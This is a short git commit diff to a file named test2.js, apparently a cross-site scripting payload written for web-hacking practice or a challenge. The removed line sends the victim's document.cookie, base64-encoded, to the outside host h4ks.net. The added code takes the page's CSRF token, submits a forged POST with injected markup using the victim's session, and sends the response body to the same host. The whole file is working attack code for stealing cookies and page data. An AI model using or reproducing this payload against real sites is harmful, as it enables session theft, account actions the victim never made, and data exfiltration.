4ccfe431e907ff86deb19f4022fe07db35f37752
Robert Vulpe <nytr0gen.george@gmail.com>
2020-01-16 15:30:59 +0000

    Update test2.js

--- test2.js
+++ test2.js
@@ -1,1 +1,12 @@
-location='//h4ks.net/go/test?'+btoa(document.cookie);
+var csrf = document.getElementsByName('_csrf_token')[0].value;
+fetch("/", {
+    "credentials": "include",
+    "headers": {
+        "content-type": "application/x-www-form-urlencoded",
+    },
+    "method": "POST",
+    "body": "name=jojo<s>&user_id=29&_csrf_token=" + csrf
+}).then(r => r.text())
+.then(body => {
+    location = '//h4ks.net/go/?'+btoa(body);
+})
